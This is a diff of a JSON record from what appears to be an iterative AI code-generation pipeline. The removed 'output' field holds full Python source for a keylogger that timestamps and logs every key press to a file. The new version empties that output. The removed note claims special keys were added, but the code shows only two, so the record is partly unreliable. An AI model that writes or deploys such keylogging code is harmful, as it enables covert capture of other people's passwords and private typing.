@@ -1,8 +1,8 @@
 {
-  "output": "\nimport keyboard\nfrom datetime import datetime\ntime_format = '%Y-%m-%d %H:%M:%S'\nlogging_path = 'keylogs.txt'\n\nspecial_keys = ['space', 'enter']\n\ndef write_to_file(text, path=logging_path):\n    try:\n        with open(path, 'a') as file:\n            file.write(f'{datetime.now().strftime(time_format)} {text}\n')\n    except Exception as e:\n        print(f'Error writing to file: {e}')\ndef on_key_press(event):\n    key_pressed = event.name\n    if len(key_pressed) > 1:\n        write_to_file(f'[{key_pressed.upper()}]')\n    elif key_pressed in special_keys:\n        write_to_file(f'[{key_pressed.upper()}]')\n    else:\n        write_to_file(key_pressed)\ndef start_keylogger():\n    keyboard.on_press(callback=on_key_press)\n    while True:\n        if keyboard.is_pressed('esc'):\n            break\nstart_keylogger()",
-  "notes": "Added more special keys to the list in line 9",
+  "output": "",
+  "notes": "Redoing full code generation since no valid previous version given.",
   "applied_fixes": [
-    "iteration1_issue2"
+    "iteration1_issue1"
   ],
   "iterations": 2
 }
